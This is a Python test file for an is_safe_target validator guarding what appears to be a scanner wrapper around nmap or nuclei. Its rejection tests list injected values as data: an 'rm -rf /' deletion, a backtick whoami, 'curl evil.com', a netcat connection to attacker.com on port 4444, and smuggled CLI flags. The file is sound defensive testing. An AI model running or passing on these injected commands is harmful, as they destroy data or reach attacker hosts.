"""
Tests for modules/validators.py
"""
import sys
import os
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from modules.validators import is_safe_target


def test_accepts_plain_hostname():
    assert is_safe_target("example.com") is True


def test_accepts_fqdn_with_subdomain():
    assert is_safe_target("scan.example.co.uk") is True


def test_accepts_ipv4():
    assert is_safe_target("192.168.1.1") is True


def test_accepts_http_url():
    assert is_safe_target("http://example.com") is True


def test_accepts_https_url_with_path():
    assert is_safe_target("https://example.com/some/path") is True


def test_rejects_empty_string():
    assert is_safe_target("") is False


def test_rejects_shell_metacharacters():
    assert is_safe_target("example.com; rm -rf /") is False
    assert is_safe_target("example.com`whoami`") is False
    assert is_safe_target("example.com && curl evil.com") is False
    assert is_safe_target("example.com|nc attacker.com 4444") is False


def test_rejects_leading_flag_injection():
    # Should never let a target be interpreted as a CLI flag by nmap/nuclei
    assert is_safe_target("--script=vuln") is False
    assert is_safe_target("-oX pwned.xml") is False


def test_rejects_whitespace_smuggled_args():
    assert is_safe_target("example.com --script malicious") is False


def test_rejects_overly_long_target():
    assert is_safe_target("a" * 300) is False


def test_accepts_ipv6_loopback():
    assert is_safe_target("::1") is True
